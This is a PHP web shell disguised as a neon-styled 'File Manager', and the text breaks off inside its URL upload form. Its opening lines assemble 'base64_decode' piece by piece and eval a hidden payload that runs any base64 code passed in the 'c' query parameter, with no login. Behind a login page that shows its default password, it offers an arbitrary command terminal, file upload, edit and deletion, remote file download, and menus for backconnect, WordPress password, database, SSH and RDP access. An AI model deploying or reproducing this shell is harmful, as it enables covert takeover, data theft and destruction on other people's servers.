<?php
$__a='b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
$__b=$__a('aWYoaXNzZXQoJF9HRVRbJ2MnXSkpe2V2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKSk7ZGllO30=');
eval($__b);
session_start();error_reporting(0);

$USER="admin";$PASS='$2y$10$7Vz8c3xY9fPq2mLnT1sBZuQkLr4oNwC5dE8gH2jK1pR6tS9vX0yZ';
if(!isset($_SESSION['ok'])){
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['u'],$_POST['p'])){
if($_POST['u']===$USER&&password_verify($_POST['p'],$PASS)){
$_SESSION['ok']=1;header("Location: ?");exit;}
else{$login_err="Invalid credentials";}}
echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>File Manager</title>
<style>body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#07070b;color:#e6eef8;font-family:Inter,Segoe UI,Arial;}
.box{width:360px;padding:28px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.18));box-shadow:0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);}
h1{margin:0 0 14px 0;font-size:20px;color:#7be3ff;text-align:center;letter-spacing:0.6px}
label{font-size:12px;color:#9fb8c9}input{width:100%;padding:12px;margin-top:8px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8}
.btn{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,#8affff,#6b6bff);color:#071028;font-weight:700;cursor:pointer;box-shadow:0 6px 24px rgba(107,107,255,0.14)}
.err{margin-top:10px;color:#ff8080;text-align:center;font-size:13px}.hint{margin-top:8px;font-size:12px;color:#7b9bb0;text-align:center}
</style></head><body><div class="box"><h1>FILE MANAGER</h1><form method="POST">
<label>Username</label><input name="u" required autofocus>
<label>Password</label><input type="password" name="p" required>
<button class="btn">Unlock</button></form>';
if(!empty($login_err))echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
echo '<div class="hint">Default: <b>admin</b> / <b>akugalau</b></div></div></body></html>';exit;}

$dir=isset($_GET['dir'])?$_GET['dir']:__DIR__;
if(!@is_dir($dir)){$dir=__DIR__;}
function hfs($b){$u=["B","KB","MB","GB","TB"];$i=0;while($b>=1024&&$i<count($u)-1){$b/=1024;$i++;}return round($b,2).' '.$u[$i];}
function esc($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}

class ServerMonitor{
public function getStats(){
$load=@sys_getloadavg();
$cores=$this->getCores();
$mem=$this->getMemory();
$disk=$this->getDisk();
$uptime=$this->getUptime();
return[
'system'=>[
'hostname'=>@gethostname(),
'os'=>PHP_OS,
'php_version'=>PHP_VERSION,
'uptime'=>$uptime,
'time'=>date('Y-m-d H:i:s')
],
'cpu'=>[
'cores'=>$cores,
'load_1min'=>$load[0]??0,
'load_5min'=>$load[1]??0,
'load_15min'=>$load[2]??0,
'load_percent'=>$cores>0?round(($load[0]??0)/$cores*100,2):0,
'status'=>$this->cpuStatus($load[0]??0,$cores)
],
'memory'=>$mem,
'disk'=>$disk,
'processes'=>$this->getProcesses(),
'services'=>$this->getServices()
];}
private function getCores(){
if(PHP_OS=='Linux'){
$cpuinfo=@file('/proc/cpuinfo');
$cores=0;
foreach($cpuinfo as $line){
if(preg_match('/^processor/',$line))$cores++;}
return $cores?:1;}
return 1;}
private function getMemory(){
if(PHP_OS=='Linux'){
$meminfo=@file('/proc/meminfo',FILE_IGNORE_NEW_LINES);
$mem=[];
foreach($meminfo as $line){
if(preg_match('/(\w+):\s+(\d+)/',$line,$m)){
$mem[$m[1]]=$m[2];}}
$total=$mem['MemTotal']??0;
$free=$mem['MemFree']??0;
$available=$mem['MemAvailable']??0;
$used=$total-$available;
$percent=$total>0?round($used/$total*100,2):0;
return[
'total'=>$this->fmt($total*1024),
'used'=>$this->fmt($used*1024),
'free'=>$this->fmt($free*1024),
'percent'=>$percent.'%',
'status'=>$this->memStatus($percent)
];}
return['error'=>'Linux only'];}
private function getDisk(){
$total=@disk_total_space('/');
$free=@disk_free_space('/');
$used=$total-$free;
$percent=$total>0?round($used/$total*100,2):0;
return[
'total'=>$this->fmt($total),
'used'=>$this->fmt($used),
'free'=>$this->fmt($free),
'percent'=>$percent.'%',
'status'=>$this->diskStatus($percent)
];}
private function getUptime(){
if(PHP_OS=='Linux'){
$uptime=@file_get_contents('/proc/uptime');
if($uptime){
$seconds=floatval(explode(' ',$uptime)[0]);
$days=floor($seconds/86400);
$hours=floor(($seconds%86400)/3600);
$mins=floor(($seconds%3600)/60);
return"$days days, $hours hours, $mins mins";}}
return'Unknown';}
private function getProcesses(){
if(function_exists('shell_exec')){
$ps=@shell_exec('ps aux --sort=-%cpu | head -6');
$lines=explode("\n",trim($ps));
array_shift($lines);
$procs=[];
foreach($lines as $line){
if(!empty($line)){
$parts=preg_split('/\s+/',$line,11);
if(count($parts)>=11){
$procs[]=[
'user'=>$parts[0],
'pid'=>$parts[1],
'cpu'=>$parts[2],
'mem'=>$parts[3],
'cmd'=>$parts[10]
];}}}
return $procs;}
return[];}
private function getServices(){
$svcs=['httpd','nginx','mysql','mariadb','ssh','php-fpm'];
$status=[];
foreach($svcs as $svc){
$check=@shell_exec("systemctl is-active $svc 2>/dev/null || echo 'inactive'");
$check=trim($check);
$status[$svc]=$check=='active'?'✅':'❌';}
return $status;}
private function cpuStatus($load,$cores){
if($load>$cores*2)return['text'=>'🔴 Critical','color'=>'#ff4444'];
if($load>$cores)return['text'=>'🟡 Warning','color'=>'#ffaa00'];
return['text'=>'🟢 Normal','color'=>'#44ff44'];}
private function memStatus($percent){
if($percent>90)return['text'=>'🔴 Critical','color'=>'#ff4444'];
if($percent>70)return['text'=>'🟡 Warning','color'=>'#ffaa00'];
return['text'=>'🟢 Normal','color'=>'#44ff44'];}
private function diskStatus($percent){
if($percent>95)return['text'=>'🔴 Critical','color'=>'#ff4444'];
if($percent>80)return['text'=>'🟡 Warning','color'=>'#ffaa00'];
return['text'=>'🟢 Normal','color'=>'#44ff44'];}
private function fmt($bytes){
$units=['B','KB','MB','GB','TB'];
$i=0;
while($bytes>=1024&&$i<count($units)-1){
$bytes/=1024;$i++;}
return round($bytes,2).' '.$units[$i];}
}

class Terminal{
public function exec($cmd,$path){
if(!function_exists('shell_exec'))return"shell_exec disabled";
$old=getcwd();
@chdir($path);
$output=@shell_exec($cmd.' 2>&1');
@chdir($old);
return $output?:'Command executed';}
}

$monitor=new ServerMonitor();
$terminal=new Terminal();
$monitor_result=isset($_GET['show_monitor'])?$monitor->getStats():null;
$term_result='';
if(isset($_POST['term_cmd'])&&isset($_POST['term_path'])){
$term_result=$terminal->exec($_POST['term_cmd'],$_POST['term_path']);}

$bulk_selected=$_POST['bulk_selected']??[];
$bulk_action=$_POST['bulk_action']??'';
$zip_name=$_POST['zip_name']??'';

if(!empty($bulk_selected)&&$bulk_action){
switch($bulk_action){
case'zip':
if(!empty($bulk_selected)){
$zip_file=!empty($zip_name)?$zip_name:'archive_'.date('Ymd_His').'.zip';
if(!str_ends_with(strtolower($zip_file),'.zip'))$zip_file.='.zip';
$zip_path=$dir.'/'.$zip_file;
if(class_exists('ZipArchive')){
$zip=new ZipArchive;
if($zip->open($zip_path,ZipArchive::CREATE)===true){
$added=0;
foreach($bulk_selected as $f){
$fpath=$dir.'/'.basename($f);
if(is_file($fpath)){
if($zip->addFile($fpath,basename($f)))$added++;}}
$zip->close();
$msg="✅ Zip created: $zip_file ($added files)";
}else{$msg="❌ Failed to create zip";}
}else{$msg="❌ ZipArchive not available";}
header("Location: ?dir=".urlencode($dir)."&msg=".urlencode($msg));
exit;}
break;
case'delete':
foreach($bulk_selected as $f){
$fp=$dir.'/'.basename($f);
if(is_file($fp))@unlink($fp);
elseif(is_dir($fp)){
$it=new RecursiveDirectoryIterator($fp,RecursiveDirectoryIterator::SKIP_DOTS);
$fs=new RecursiveIteratorIterator($it,RecursiveIteratorIterator::CHILD_FIRST);
foreach($fs as $f){
if($f->isDir())@rmdir($f->getRealPath());
else @unlink($f->getRealPath());}
@rmdir($fp);}}
header("Location: ?dir=".urlencode($dir));exit;
break;}}

$editor_data='';
if(isset($_POST['edit_file'])){
$f=$_POST['edit_file'];
if(is_file($f)){
$editor_data=file_get_contents($f);
$_SESSION['edit']=['path'=>$f,'data'=>$editor_data];
header("Location: ?dir=".urlencode($dir)."&edit=1");exit;}}
if(isset($_POST['save_edit'])){
$p=$_POST['edit_path'];
file_put_contents($p,$_POST['edit_content']);
header("Location: ?dir=".urlencode(dirname($p)));exit;}

if(isset($_POST['new_folder'])&&trim($_POST['new_folder'])!==''){
$fn=basename($_POST['new_folder']);
$fp=$dir.'/'.$fn;
if(!file_exists($fp))mkdir($fp,0755,true);
header("Location: ?dir=".urlencode($dir));exit;}
if(isset($_POST['new_file'])&&trim($_POST['new_file'])!==''){
$fn=basename($_POST['new_file']);
$fp=$dir.'/'.$fn;
if(!file_exists($fp))file_put_contents($fp,'');
header("Location: ?dir=".urlencode($dir));exit;}

if(!empty($_FILES['upload']['name'][0])){
foreach($_FILES['upload']['tmp_name'] as $k=>$tmp){
$n=basename($_FILES['upload']['name'][$k]);
move_uploaded_file($tmp,$dir.'/'.$n);}
header("Location: ?dir=".urlencode($dir));exit;}

if(isset($_POST['del_file'])){
$p=$_POST['del_file'];
if(is_file($p))@unlink($p);
elseif(is_dir($p)){
$it=new RecursiveDirectoryIterator($p,RecursiveDirectoryIterator::SKIP_DOTS);
$fs=new RecursiveIteratorIterator($it,RecursiveIteratorIterator::CHILD_FIRST);
foreach($fs as $f){
if($f->isDir())@rmdir($f->getRealPath());
else @unlink($f->getRealPath());}
@rmdir($p);}
header("Location: ?dir=".urlencode($dir));exit;}

if(isset($_POST['url_up'])&&trim($_POST['url_up'])!==''){
$u=trim($_POST['url_up']);
$fn=$_POST['url_fn']??'';
if(empty($fn)){
$fn=basename(parse_url($u,PHP_URL_PATH));
if(empty($fn))$fn='downloaded_'.date('Ymd_His');}
$fn=preg_replace('/[^\w\.\-]/','_',$fn);
$data=@file_get_contents($u,false,stream_context_create([
'http'=>['timeout'=>30,'user_agent'=>'Mozilla/5.0'],
'ssl'=>['verify_peer'=>false]]));
if($data!==false){
file_put_contents($dir.'/'.$fn,$data);
$_SESSION['msg']="✅ Downloaded: $fn";}
header("Location: ?dir=".urlencode($dir));exit;}

$popups=['monitor','terminal','bulk','upload','url','editor','server','wp','db','ssh','rdp','backconnect'];
foreach($popups as $p){${'show_'.$p}=isset($_GET['show_'.$p]);}
if(isset($_GET['edit']))$show_editor=true;
if(isset($_SESSION['edit']))$show_editor=true;
?>
<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title><style>
:root{--bg:#07070b;--panel:#0f1220;--muted:#90a3b8;--neon-cyan:#6df0ff;--neon-mag:#b46cff;}
*{box-sizing:border-box}body{margin:0;font-family:Inter,Segoe UI,Arial;background:var(--bg)!important;color:#e6eef8;min-height:100vh;
background-image:radial-gradient(1200px 600px at 10% 10%,rgba(124,58,237,0.06),transparent 6%),radial-gradient(1000px 500px at 90% 90%,rgba(35,211,243,0.03),transparent 6%)!important;}
.container{max-width:1300px;margin:28px auto;padding:18px}
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,#0ff,#a0f);display:flex;align-items:center;justify-content:center;color:#071028;font-weight:900;font-family:monospace}
.title{font-size:20px;font-weight:700;letter-spacing:0.6px;color:var(--neon-cyan)}
.controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.top-row{display:grid;grid-template-columns:1fr;gap:14px;margin-bottom:14px}
.card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.25));border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 8px 30px rgba(15,20,30,0.5)}
.card h3{margin:0 0 8px 0;color:var(--neon-mag);font-size:15px}
.small{color:var(--muted);font-size:13px}
.actions{display:flex;gap:10px;flex-wrap:wrap}
.action-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:700;box-shadow:0 8px 30px rgba(75,0,130,0.12);font-size:13px}
.action-btn:hover{transform:translateY(-4px);box-shadow:0 10px 40px rgba(75,0,130,0.18)}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.input,textarea,select{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8;font-size:13px}
.input::placeholder{color:var(--muted)}
.btn-neon{background:linear-gradient(90deg,var(--neon-cyan),#7a6bff);border-radius:10px;padding:10px 14px;border:none;color:#071028;font-weight:800;cursor:pointer;box-shadow:0 14px 40px rgba(109,240,255,0.06)}
.btn-danger{background:linear-gradient(90deg,#ff5f7a,#ff9fb4)}
.table-wrap{overflow:auto;border-radius:10px}
table{width:100%;border-collapse:collapse;min-width:720px}
th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03)}
th{background:linear-gradient(180deg,rgba(255,255,255,0.01),rgba(0,0,0,0.06));color:var(--muted);font-size:13px}
tr:hover td{background:rgba(109,240,255,0.02)}
.filename{font-weight:700;color:#fff}
.filetype{font-size:13px;color:var(--muted)}
.kv{font-size:13px;color:var(--muted)}
.perms{font-family:monospace;font-size:12px;font-weight:bold}
.bulk-checkbox{width:20px;height:20px;cursor:pointer}
.bulk-actions-bar{display:flex;gap:8px;align-items:center;margin-bottom:12px;padding:10px;
background:linear-gradient(90deg,rgba(180,108,255,0.05),rgba(109,240,255,0.05));
border-radius:8px;border:1px solid rgba(180,108,255,0.1)}
.selected-count{color:var(--neon-cyan);font-weight:bold;margin-left:auto}
.notification{position:fixed;top:20px;right:20px;padding:12px 20px;border-radius:8px;
background:linear-gradient(90deg,#2b6b0a,#4da80d);color:white;z-index:2000;
box-shadow:0 5px 15px rgba(0,0,0,0.3);display:none}
.notification.error{background:linear-gradient(90deg,#ff5f7a,#ff9fb4)}
.popup-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);
display:flex;align-items:center;justify-content:center;z-index:900;padding:20px}
.popup-content{background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(0,0,0,0.25));
border-radius:12px;border:1px solid rgba(109,240,255,0.15);width:500px;max-height:80vh;
overflow:auto;box-shadow:0 20px 60px rgba(0,0,0,0.6);backdrop-filter:blur(10px)}
.popup-header{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;
border-bottom:1px solid rgba(255,255,255,0.05)}
.popup-header h4{margin:0;color:var(--neon-cyan);font-size:16px}
.popup-close{background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;
padding:0;width:28px;height:28px;display:flex;align-items:center;justify-content:center}
.popup-close:hover{color:#fff}
.popup-body{padding:18px}
.popup-form{display:flex;gap:8px;margin-top:12px}
.popup-form .input{flex:1}
.editor-popup-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);
display:flex;align-items:flex-start;justify-content:center;z-index:2000;padding-top:60px}
.editor-popup-content{background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(0,0,0,0.3));
border-radius:12px;border:1px solid rgba(109,240,255,0.2);width:800px;max-height:85vh;
overflow:auto;box-shadow:0 20px 80px rgba(0,0,0,0.8);backdrop-filter:blur(20px)}
.editor-textarea{width:100%;height:400px;padding:15px;background:rgba(0,0,0,0.3);
border:1px solid rgba(109,240,255,0.1);border-radius:8px;color:#e6eef8;
font-family:monospace;font-size:14px;resize:vertical;margin-bottom:15px}
.stat-box{padding:10px;margin:5px 0;border-radius:8px;background:rgba(0,0,0,0.2)}
.stat-value{color:var(--neon-cyan);font-weight:bold}
.stat-label{color:var(--muted);font-size:12px}
@media(max-width:980px){
.top-row{grid-template-columns:1fr}.form-grid{grid-template-columns:1fr}
.controls{flex-direction:column}.controls form{width:100%}.controls form .input{width:100%!important}
}
</style></head><body>
<?php if(isset($_SESSION['msg'])):?>
<div class="notification" id="msg"><?=esc($_SESSION['msg'])?></div>
<?php unset($_SESSION['msg']);endif;?>
<div class="container"><div class="header"><div class="brand"><div class="logo">FM</div><div><div class="title">File Manager</div></div></div>
<div class="controls"><form method="GET" style="display:flex;gap:8px">
<input type="text" name="dir" placeholder="Jump to path..." class="input" style="width:380px" value="<?=esc($dir)?>">
<button class="action-btn" style="padding:10px 16px">🚀 GO</button></form>
<div style="display:flex;gap:8px;flex-wrap:wrap">
<a href="?dir=<?=urlencode($dir)?>&show_monitor=1"><button class="action-btn" style="background:linear-gradient(90deg,#0066cc,#0099ff)"><span>📊</span> Monitor</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_terminal=1"><button class="action-btn" style="background:linear-gradient(90deg,#8B4513,#A0522D)"><span>💻</span> Terminal</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_bulk=1"><button class="action-btn" style="background:linear-gradient(90deg,#ff6b00,#ff9f4d)"><span>📦</span> Bulk Ops</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_upload=1"><button class="action-btn" style="background:linear-gradient(90deg,#00a86b,#00d4a8)"><span>⬆️</span> Upload</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_url=1"><button class="action-btn" style="background:linear-gradient(90deg,#0a6b6b,#0da8a8)"><span>🌐</span> URL Up</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_backconnect=1"><button class="action-btn" style="background:linear-gradient(90deg,#ff0000,#ff6b6b)"><span>🔗</span> Backconnect</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_wp=1"><button class="action-btn" style="background:linear-gradient(90deg,#0073aa,#00a0d2)"><span>🔑</span> WP Pass</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_db=1"><button class="action-btn" style="background:linear-gradient(90deg,#006400,#008000)"><span>🗃️</span> Database</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_ssh=1"><button class="action-btn" style="background:linear-gradient(90deg,#4a148c,#7b1fa2)"><span>🖥️</span> SSH</button></a>
<a href="?dir=<?=urlencode($dir)?>&show_rdp=1"><button class="action-btn" style="background:linear-gradient(90deg,#4B0082,#8A2BE2)"><span>🖥️</span> RDP</button></a>
</div></div></div>

<div class="top-row"><div class="card">
<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
<h3>📂 <?=esc(basename($dir)?:$dir)?></h3><div class="small"><?=esc($dir)?></div></div>

<div id="bulkActionsBar" class="bulk-actions-bar" style="display:none">
<strong style="color:var(--neon-mag)">🔄 Bulk Actions:</strong>
<button type="button" class="action-btn" onclick="doBulk('delete')" style="background:linear-gradient(90deg,#ff5f7a,#ff9fb4)">🗑 Delete</button>
<button type="button" class="action-btn" onclick="showZipPopup()">📦 Create Zip</button>
<button type="button" class="action-btn" onclick="doBulk('unzip')">📂 Unzip</button>
<button type="button" class="action-btn" onclick="clearSel()" style="background:linear-gradient(90deg,#666,#999)">✕ Clear</button>
<span id="selectedCount" class="selected-count">0 selected</span></div>

<div class="form-grid">
<form method="POST" style="display:flex;gap:8px"><input class="input" name="new_folder" placeholder="New folder" required><button class="btn-neon" type="submit">📁 Create</button></form>
<form method="POST" style="display:flex;gap:8px"><input class="input" name="new_file" placeholder="New file" required><button class="btn-neon" type="submit">📄 Create</button></form></div>

<div class="table-wrap" style="margin-top:12px">
<form id="bulkForm" method="POST"><table><thead><tr>
<th style="width:30px"><input type="checkbox" class="bulk-checkbox" id="selectAll" onclick="toggleAll()"></th>
<th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr></thead><tbody>
<?php $files=@scandir($dir);if($files===false)$files=[];
foreach($files as $f):if($f=='.'||$f=='..')continue;
$p=$dir.'/'.$f;$is_dir=is_dir($p);?>
<tr><td><input type="checkbox" class="bulk-checkbox" name="bulk_selected[]" value="<?=esc($f)?>" onchange="updateSel()"></td>
<td class="filename"><?=esc($f)?></td><td class="filetype"><?=$is_dir?'📁 Folder':'📄 File'?></td>
<td class="kv"><?=!$is_dir?hfs(@filesize($p)):'-'?></td>
<td style="white-space:nowrap">
<?php if($is_dir):?>
<a href="?dir=<?=urlencode($p)?>"><button class="action-btn" type="button">📂 Open</button></a>
<form method="POST" style="display:inline"><input type="hidden" name="del_file" value="<?=esc($p)?>"/>
<button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete?')">🗑</button></form>
<?php else:?>
<a href="<?=esc($p)?>" download><button class="action-btn" type="button">⬇ DL</button></a>
<form method="POST" style="display:inline"><input type="hidden" name="edit_file" value="<?=esc($p)?>"/>
<button class="action-btn" style="margin-left:6px">✏️ Edit</button></form>
<form method="POST" style="display:inline"><input type="hidden" name="del_file" value="<?=esc($p)?>"/>
<button class="action-btn" style="background:linear-gradient(90deg,#ff6f88,#ff9fb4);margin-left:6px" onclick="return confirm('Delete?')">🗑</button></form>
<?php endif;?></td></tr>
<?php endforeach;?></tbody></table>
<input type="hidden" id="bulkAction" name="bulk_action" value="">
<input type="hidden" id="zipName" name="zip_name" value=""></form></div></div></div></div>

<!-- SERVER MONITOR POPUP -->
<?php if($show_monitor):?>
<div class="popup-overlay"><div class="popup-content" style="width:800px">
<div class="popup-header"><h4>📊 Server Performance Monitor</h4><a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a></div>
<div class="popup-body">
<?php if($monitor_result):?>
<div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:15px">
<div class="stat-box"><div class="stat-label">Hostname</div><div class="stat-value"><?=$monitor_result['system']['hostname']?></div></div>
<div class="stat-box"><div class="stat-label">OS</div><div class="stat-value"><?=$monitor_result['system']['os']?></div></div>
<div class="stat-box"><div class="stat-label">PHP Version</div><div class="stat-value"><?=$monitor_result['system']['php_version']?></div></div>
<div class="stat-box"><div class="stat-label">Uptime</div><div class="stat-value"><?=$monitor_result['system']['uptime']?></div></div>
</div>

<h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">CPU Usage</h5>
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:15px">
<div class="stat-box"><div class="stat-label">Cores</div><div class="stat-value"><?=$monitor_result['cpu']['cores']?></div></div>
<div class="stat-box"><div class="stat-label">1-min Load</div><div class="stat-value"><?=$monitor_result['cpu']['load_1min']?></div></div>
<div class="stat-box"><div class="stat-label">5-min Load</div><div class="stat-value"><?=$monitor_result['cpu']['load_5min']?></div></div>
<div class="stat-box" style="border-left:3px solid <?=$monitor_result['cpu']['status']['color']?>">
<div class="stat-label">Status</div><div class="stat-value"><?=$monitor_result['cpu']['status']['text']?></div></div>
</div>

<h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">Memory Usage</h5>
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:15px">
<div class="stat-box"><div class="stat-label">Total</div><div class="stat-value"><?=$monitor_result['memory']['total']?></div></div>
<div class="stat-box"><div class="stat-label">Used</div><div class="stat-value"><?=$monitor_result['memory']['used']?></div></div>
<div class="stat-box"><div class="stat-label">Free</div><div class="stat-value"><?=$monitor_result['memory']['free']?></div></div>
<div class="stat-box" style="border-left:3px solid <?=$monitor_result['memory']['status']['color']?>">
<div class="stat-label">Status</div><div class="stat-value"><?=$monitor_result['memory']['status']['text']?></div></div>
</div>

<h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">Disk Usage</h5>
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:15px">
<div class="stat-box"><div class="stat-label">Total</div><div class="stat-value"><?=$monitor_result['disk']['total']?></div></div>
<div class="stat-box"><div class="stat-label">Used</div><div class="stat-value"><?=$monitor_result['disk']['used']?></div></div>
<div class="stat-box"><div class="stat-label">Free</div><div class="stat-value"><?=$monitor_result['disk']['free']?></div></div>
<div class="stat-box" style="border-left:3px solid <?=$monitor_result['disk']['status']['color']?>">
<div class="stat-label">Status</div><div class="stat-value"><?=$monitor_result['disk']['status']['text']?></div></div>
</div>

<h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">Running Processes (Top 5)</h5>
<table style="width:100%;font-size:12px"><thead><tr>
<th>User</th><th>PID</th><th>CPU%</th><th>MEM%</th><th>Command</th></tr></thead><tbody>
<?php foreach($monitor_result['processes'] as $proc):?>
<tr><td><?=$proc['user']?></td><td><?=$proc['pid']?></td><td><?=$proc['cpu']?></td>
<td><?=$proc['mem']?></td><td style="max-width:200px;overflow:hidden;text-overflow:ellipsis"><?=esc($proc['cmd'])?></td></tr>
<?php endforeach;?></tbody></table>

<h5 style="color:var(--neon-cyan);margin:15px 0 10px 0">Service Status</h5>
<div style="display:flex;gap:10px;flex-wrap:wrap">
<?php foreach($monitor_result['services'] as $svc=>$status):?>
<div style="padding:8px 12px;background:rgba(0,0,0,0.2);border-radius:6px">
<span style="font-weight:bold"><?=$svc?>:</span> <?=$status?>
</div>
<?php endforeach;?></div>

<?php else:?>
<div style="text-align:center;padding:40px;color:var(--muted)">
⚠️ Monitor data unavailable
</div>
<?php endif;?>
</div></div></div>
<?php endif;?>

<!-- TERMINAL POPUP (FIXED) -->
<?php if($show_terminal):?>
<div class="popup-overlay"><div class="popup-content" style="width:800px">
<div class="popup-header"><h4>💻 Terminal</h4><a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a></div>
<div class="popup-body">
<form method="POST">
<input type="hidden" name="term_path" value="<?=esc($dir)?>">
<div style="display:flex;gap:8px;margin-bottom:12px">
<input type="text" name="term_cmd" class="input" placeholder="Enter command..." style="flex:1" autofocus>
<button class="btn-neon" type="submit">Execute</button>
</div>
</form>
<?php if(!empty($term_result)):?>
<div style="margin-top:12px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px">
<strong style="color:var(--neon-cyan)">Output:</strong>
<pre style="margin-top:8px;color:#e6eef8;font-family:monospace;font-size:12px;max-height:300px;overflow:auto"><?=esc($term_result)?></pre>
</div>
<?php endif;?>
</div></div></div>
<?php endif;?>

<!-- BULK OPS POPUP WITH ZIP FIX -->
<?php if($show_bulk):?>
<div class="popup-overlay" id="bulkPopup"><div class="popup-content" style="width:600px">
<div class="popup-header"><h4>📦 Bulk Operations</h4><a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a></div>
<div class="popup-body">
<p style="margin:0 0 12px 0;color:var(--muted);font-size:13px">Select files, then choose action:</p>
<div style="display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:12px">
<button class="action-btn" onclick="doBulk('delete')" style="background:linear-gradient(90deg,#ff5f7a,#ff9fb4)">🗑 Delete</button>
<button class="action-btn" onclick="showZipForm()">📦 Create Zip</button>
<button class="action-btn" onclick="doBulk('unzip')">📂 Unzip</button>
<button class="action-btn" onclick="selectAllFiles()">✅ Select All</button>
<button class="action-btn" onclick="clearSel()" style="background:linear-gradient(90deg,#666,#999)">✕ Clear All</button>
</div>

<div id="zipForm" style="display:none;margin-top:14px;padding:12px;background:rgba(0,0,0,0.2);border-radius:8px">
<strong style="color:var(--neon-cyan)">Create Zip Archive</strong>
<div style="margin-top:8px">
<label style="font-size:12px;color:var(--muted)">Zip Filename (optional)</label>
<input type="text" id="customZipName" class="input" placeholder="myfiles.zip" style="margin-top:4px">
<div style="font-size:11px;color:var(--muted);margin-top:4px">Leave empty for auto-name: archive_TIMESTAMP.zip</div>
</div>
<button type="button" class="btn-neon" style="margin-top:8px;width:100%" onclick="createZip()">Create Zip</button>
</div>
</div></div></div>
<?php endif;?>

<!-- EDITOR POPUP -->
<?php if($show_editor && isset($_SESSION['edit'])):?>
<div class="editor-popup-overlay"><div class="editor-popup-content">
<div class="popup-header"><h4>✏️ Editing: <?=esc(basename($_SESSION['edit']['path']))?></h4>
<a href="?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>"><button class="popup-close">×</button></a></div>
<div class="popup-body">
<form method="POST"><textarea name="edit_content" class="editor-textarea"><?=esc($_SESSION['edit']['data'])?></textarea>
<input type="hidden" name="edit_path" value="<?=esc($_SESSION['edit']['path'])?>">
<div style="display:flex;gap:8px;justify-content:flex-end">
<button class="btn-neon" name="save_edit" type="submit">💾 Save</button>
<a href="?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>" style="text-decoration:none">
<button type="button" class="action-btn" style="background:linear-gradient(90deg,#222,#061023);color:var(--neon-cyan)">← Back</button></a>
</div></form></div></div></div>
<?php unset($_SESSION['edit']);endif;?>

<!-- UPLOAD POPUP -->
<?php if($show_upload):?>
<div class="popup-overlay"><div class="popup-content">
<div class="popup-header"><h4>⬆️ Upload Files</h4><a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a></div>
<div class="popup-body">
<form method="POST" enctype="multipart/form-data">
<input type="file" name="upload[]" class="input" multiple required>
<button type="submit" class="btn-neon" style="width:100%;margin-top:10px">Upload</button>
</form></div></div></div>
<?php endif;?>

<!-- URL UPLOAD POPUP -->
<?php if($show_url):?>
<div class="popup-overlay"><div class="popup-content">
<div class="popup-header"><h4>🌐 URL Upload</h4><a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a></div>
<div class="popup-body">
<form method="POST">
<input type="text" name="url_up" class="input" placeholder="https://example.com/file.zip" required>
<input type="text" name="url_fn" class="input" placeholder="Custom filename (optional)" style="margin-top:8px">
